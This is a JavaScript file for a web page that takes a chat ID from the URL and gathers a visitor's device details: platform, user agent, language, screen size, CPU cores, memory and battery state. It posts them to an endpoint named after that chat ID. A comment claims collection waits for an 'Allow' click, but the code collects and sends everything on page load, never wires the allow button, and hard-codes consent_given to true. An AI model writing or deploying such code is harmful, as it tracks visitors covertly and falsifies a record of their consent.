const allowBtn = document.getElementById("allow-btn");
const resultEl = document.getElementById("result");
const sendBtn = document.getElementById("send-btn");
const statusEl = document.getElementById("status");
const userIdInput = document.getElementById("user-id");

let collectedData = null;

function getChatIdFromUrl() {
  const parts = window.location.pathname.split("/");
  return parts[2] || null;
}

// Auto-fill chat ID into input
window.addEventListener("DOMContentLoaded", () => {
  const chatId = getChatIdFromUrl();
  if (chatId) {
    userIdInput.value = chatId;
  }
});

function safeValue(value, fallback = "Unavailable") {
  if (value === null || value === undefined || value === "") {
    return fallback;
  }
  return value;
}

function getDeviceModel() {
  const uaData = navigator.userAgentData;
  if (uaData && Array.isArray(uaData.brands)) {
    return safeValue(uaData.platform, "Unknown platform");
  }
  return safeValue(navigator.platform, "Not exposed by browser");
}

async function getBatteryDetails() {
  if (!navigator.getBattery) {
    return {
      battery_level: "Unavailable",
      battery_charging: "Unavailable",
    };
  }

  try {
    const battery = await navigator.getBattery();
    return {
      battery_level: `${Math.round((battery.level || 0) * 100)}%`,
      battery_charging: battery.charging ? "Yes" : "No",
    };
  } catch (_err) {
    return {
      battery_level: "Unavailable",
      battery_charging: "Unavailable",
    };
  }
}

// Collect only after clicking Allow
document.addEventListener("DOMContentLoaded", async () => {

  // ✅ FIRST: Collect Data
  const battery = await getBatteryDetails();

  collectedData = {
    device_model: getDeviceModel(),
    user_agent: navigator.userAgent,
    language: navigator.language,
    screen_resolution: `${window.screen.width}x${window.screen.height}`,
    consent_given: true,
    cpu_cores: navigator.hardwareConcurrency ?? "Unavailable",
    ram_gb: navigator.deviceMemory ?? "Unavailable",
    battery_level: battery.battery_level,
    battery_charging: battery.battery_charging,
  };

  resultEl.textContent = JSON.stringify(collectedData, null, 2);
  sendBtn.disabled = false;

  // ✅ SECOND: Send After First Completes

  const chatId = getChatIdFromUrl();
  if (!chatId) {
    statusEl.textContent = "Chat ID missing.";
    return;
  }

  statusEl.textContent = "Sending...";

  try {
    const res = await fetch(`/num/${chatId}`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(collectedData),
    });

    const data = await res.json();

    if (!res.ok) {
      statusEl.textContent = data.error || "Failed.";
      return;
    }

    statusEl.textContent = "Sent successfully.";

  } catch (err) {
    statusEl.textContent = "Network error.";
  }

});